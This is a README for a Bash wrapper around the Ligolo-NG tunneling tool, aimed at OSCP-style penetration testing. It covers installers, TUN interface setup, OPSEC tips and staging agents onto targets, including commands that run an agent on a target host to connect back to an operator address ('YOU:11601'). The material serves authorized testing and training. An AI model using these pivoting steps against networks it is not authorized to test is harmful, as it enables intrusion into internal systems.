# OSCP-Ligolo — Pivot Wrapper for Ligolo-NG

Interactive Bash wrapper around [Ligolo-NG](https://github.com/nicocha30/ligolo-ng) for OSCP-style internal pivoting. Centralizes interface/tunnel setup, agent staging, proxy launch, and operator quick-reference in one workspace.

> ⚠️ **Authorized use only.** Use on systems and networks you own or have written permission to assess. Tunneling tools are noisy on the wire and tend to upset blue teams who didn't sign your engagement letter.

---

## What it does

Ligolo-NG is the actual tunneling engine. This repo is the operator wrapper around it:

- One workspace directory for proxy + agents + config
- Pre-staged cross-platform agent binaries with clean names (`ligolo-agent-windows-amd64.exe`, etc.)
- Helpers to spin up multiple `ligolomachine0X` TUN interfaces with `240.0.0.X/32` routes
- Stale-route cleanup between engagements
- Quick-reference tables for which agent to drop on which target
- One-shot setup scripts for both Kali and Arch/CachyOS

---

## Files

| File | Purpose |
|---|---|
| `setup-ligolo.sh` | One-shot installer for Kali / Debian / Ubuntu (uses `apt` + `dpkg`) |
| `setup-ligolo-arch.sh` | One-shot installer for Arch / CachyOS / BlackArch (uses release tarballs) |
| `tunnels.sh` | Interactive wrapper — launches `proxy`, prints agent reference table |
| `ligolofix.sh` | Creates 5× `ligolomachineXX` TUN interfaces + routes / wipes stale state |

After install, the workspace lives at `~/Desktop/OSCP/LIGOLO/` containing:

```
~/Desktop/OSCP/LIGOLO/
├── proxy                       # ligolo-ng proxy binary
├── ligolo-ng.yaml              # config (stubbed by setup script)
├── tunnels.sh                  # copied/symlinked from this repo
├── ligolofix.sh                # copied/symlinked from this repo
└── agents/
    ├── ligolo-agent-linux-amd64
    ├── ligolo-agent-linux-arm64
    ├── ligolo-agent-windows-amd64.exe
    ├── ligolo-agent-windows-arm64.exe
    ├── ligolo-agent-darwin-amd64
    ├── ligolo-agent-darwin-arm64
    └── ligolo-agent-freebsd-{amd64,arm64}
```

---

## Install

### Kali / Debian / Ubuntu

```bash
git clone https://github.com/1337codes/OSCP-Ligolo
cd OSCP-Ligolo
chmod +x setup-ligolo.sh
sudo bash setup-ligolo.sh
```

This pulls Ligolo-NG via Kali's `ligolo-ng` and `ligolo-ng-common-binaries` packages and stages everything.

### Arch / CachyOS / BlackArch

The upstream `setup-ligolo.sh` is `apt`-only — it dies with `sudo: apt-get: command not found` on Arch. Use the Arch-native script instead:

```bash
git clone https://github.com/1337codes/OSCP-Ligolo
cd OSCP-Ligolo
chmod +x setup-ligolo-arch.sh
./setup-ligolo-arch.sh
```

This pulls the proxy + agents directly from upstream [nicocha30/ligolo-ng releases](https://github.com/nicocha30/ligolo-ng/releases) (same binaries Kali repackages, just no `apt` middleman).

To pin a specific version: `LIGOLO_VERSION=0.8.3 ./setup-ligolo-arch.sh`

### Manual install (any distro)

If neither setup script fits, do it by hand:

```bash
WORK=~/Desktop/OSCP/LIGOLO
VER=0.8.3
mkdir -p "$WORK/agents"

# Proxy
curl -sL "https://github.com/nicocha30/ligolo-ng/releases/download/v${VER}/ligolo-ng_proxy_${VER}_linux_amd64.tar.gz" \
  | tar xz -C /tmp proxy && mv /tmp/proxy "$WORK/proxy" && chmod +x "$WORK/proxy"

# Agents (cross-platform)
for os in linux windows darwin freebsd; do
  for arch in amd64 arm64; do
    ext=""; [[ $os == windows ]] && ext=.exe
    tmp=$(mktemp -d)
    curl -sLf "https://github.com/nicocha30/ligolo-ng/releases/download/v${VER}/ligolo-ng_agent_${VER}_${os}_${arch}.tar.gz" \
      | tar xz -C "$tmp" 2>/dev/null \
      && mv "$tmp/agent${ext}" "$WORK/agents/ligolo-agent-${os}-${arch}${ext}" \
      && echo "[+] ${os}-${arch}"
    rm -rf "$tmp"
  done
done
chmod +x "$WORK/agents/"*

# TUN module
sudo modprobe tun
echo tun | sudo tee /etc/modules-load.d/tun.conf   # Arch / systemd
# echo tun | sudo tee -a /etc/modules               # Debian / sysv

# Minimal config
cat > "$WORK/ligolo-ng.yaml" <<'YAML'
listen: 0.0.0.0:11601
selfcert: true
selfcert-domain: ligolo
verbose: false
YAML
```

---

## Hardcoded path warning

Both `tunnels.sh` and `ligolofix.sh` hard-code `/home/alien/Desktop/OSCP/LIGOLO` as the workspace. If your username isn't `alien`, fix it once:

```bash
sed -i "s|/home/alien/Desktop/OSCP/LIGOLO|$HOME/Desktop/OSCP/LIGOLO|g" tunnels.sh ligolofix.sh
```

Or symlink the workspace so the literal path resolves:

```bash
sudo ln -s "$HOME/Desktop/OSCP/LIGOLO" /home/alien/Desktop/OSCP/LIGOLO
```

---

## Usage

### Start the proxy

```bash
cd ~/Desktop/OSCP/LIGOLO
bash tunnels.sh
```

The wrapper prints a per-OS/arch agent reference table, then prompts for proxy options and launches `./proxy`.

### Set up TUN interfaces + routes

Before connecting agents you need TUN interfaces with the `240.0.0.X` route range that Ligolo uses internally:

```bash
bash ligolofix.sh
# choose [1] to create ligolomachine01..05 + routes
# choose [2] to wipe stale state between engagements
```

Or as a one-time alias:

```fish
# fish
alias ligolofix 'bash ~/Desktop/OSCP/LIGOLO/ligolofix.sh'
```

```bash
# bash/zsh
alias ligolofix='bash ~/Desktop/OSCP/LIGOLO/ligolofix.sh'
```

### Drop the agent on target

Pick the matching binary from `agents/` and transfer it (use [DualServe](https://github.com/1337codes/OSCP-HTTP-SMB-File-Transfer-Server) for the carry):

```
Linux x64       → ligolo-agent-linux-amd64
Linux arm64     → ligolo-agent-linux-arm64
Windows x64     → ligolo-agent-windows-amd64.exe
Windows arm64   → ligolo-agent-windows-arm64.exe
macOS x64       → ligolo-agent-darwin-amd64
macOS arm64     → ligolo-agent-darwin-arm64
FreeBSD x64     → ligolo-agent-freebsd-amd64
```

How to identify the target's arch:

```bash
# Linux/BSD/macOS
uname -s; uname -m

# Windows (cmd)
echo %PROCESSOR_ARCHITECTURE%
```

Then on the target:

```bash
# Linux
chmod +x ligolo-agent-linux-amd64
./ligolo-agent-linux-amd64 -connect YOU:11601 -ignore-cert
```

```powershell
# Windows
.\ligolo-agent-windows-amd64.exe -connect YOU:11601 -ignore-cert
```

---

## Troubleshooting

### `sudo: apt-get: command not found` (Arch/CachyOS)

You ran `setup-ligolo.sh` instead of `setup-ligolo-arch.sh`. Use the Arch script:

```bash
chmod +x setup-ligolo-arch.sh
./setup-ligolo-arch.sh
```

### `ligolo-proxy missing after install — bailing`

Same root cause — the apt path failed silently and `command -v ligolo-proxy` returned nothing. The Arch script puts the binary at `~/Desktop/OSCP/LIGOLO/proxy` directly (no PATH dependency), so check there:

```bash
ls -la ~/Desktop/OSCP/LIGOLO/proxy
~/Desktop/OSCP/LIGOLO/proxy -version
```

### `RTNETLINK answers: Operation not permitted` when creating tun

You need root for `ip tuntap`. Either run `ligolofix.sh` with `sudo` or grant `CAP_NET_ADMIN` to your user. The wrapper already calls `sudo ip tuntap add user "$(whoami)" mode tun ...` — it should prompt for password.

### TUN interface vanishes after reboot

The Debian-native `setup-ligolo.sh` writes to `/etc/modules`, which Arch ignores. Use `/etc/modules-load.d/` instead:

```bash
echo tun | sudo tee /etc/modules-load.d/tun.conf
```

`setup-ligolo-arch.sh` does this automatically.

### Agent can't reach proxy / TLS errors

- Confirm the proxy is listening: `sudo ss -tlnp | grep 11601`
- Most agents need `-ignore-cert` against the self-signed cert that the YAML stub enables
- If the agent runs but the proxy never sees a connection, check the firewall (`ufw`, `firewalld`, or VPN provider)

### `proxy` binary won't execute (`Exec format error`)

You grabbed the wrong arch. Re-run the setup script — `setup-ligolo-arch.sh` always pulls `linux/amd64` for the proxy. If you're on ARM, edit the script's `PROXY_TGZ` line to match your host arch (e.g. `linux_arm64`).

### `ligolofix.sh` says routes already exist

That's option `[2]` territory — it'll flush the stale state. Safe to run between engagements:

```bash
bash ligolofix.sh
# pick [2]
```

### Want a newer Ligolo version

```bash
LIGOLO_VERSION=0.9.0 ./setup-ligolo-arch.sh   # whenever they ship one
```

The script is version-pinned but the upstream URL pattern is stable.

---

## Workspace layout reference

```
~/Desktop/OSCP/LIGOLO/
├── proxy                            # ligolo-proxy binary
├── ligolo-ng.yaml                   # config — listen addr, TLS, etc
├── tunnels.sh                       # interactive launcher
├── ligolofix.sh                     # interface + route helper
└── agents/
    ├── ligolo-agent-linux-amd64
    ├── ligolo-agent-linux-arm64
    ├── ligolo-agent-windows-amd64.exe
    ├── ligolo-agent-windows-arm64.exe
    ├── ligolo-agent-darwin-amd64
    ├── ligolo-agent-darwin-arm64
    ├── ligolo-agent-freebsd-amd64
    └── ligolo-agent-freebsd-arm64
```

The `proxy` binary is what `tunnels.sh` execs. The `agents/` directory is what you `scp` / curl / SMB-copy onto the target.

---

## OPSEC notes

- Default config uses `selfcert: true` — agents must use `-ignore-cert`. For a real engagement, generate a proper cert and disable self-signed.
- The proxy binds `0.0.0.0:11601` by default. On a shared red-team box, lock that to your VPN tunnel: edit `listen:` in `ligolo-ng.yaml` to `tun0:11601` (or whatever interface).
- `ligolomachine0X` is recognizable in netstat / interface listings on your own box. That's a *you* opsec issue, not a target one — but worth knowing if you share the box.

---

## Credits

Wrapper by [@1337codes](https://github.com/1337codes/OSCP-Ligolo). Underlying engine is [Ligolo-NG by nicocha30](https://github.com/nicocha30/ligolo-ng).

Arch/CachyOS install path, manual install fallback, and troubleshooting section added based on real-world use on rolling-release distros where the Kali-flavored `apt` install can't run.
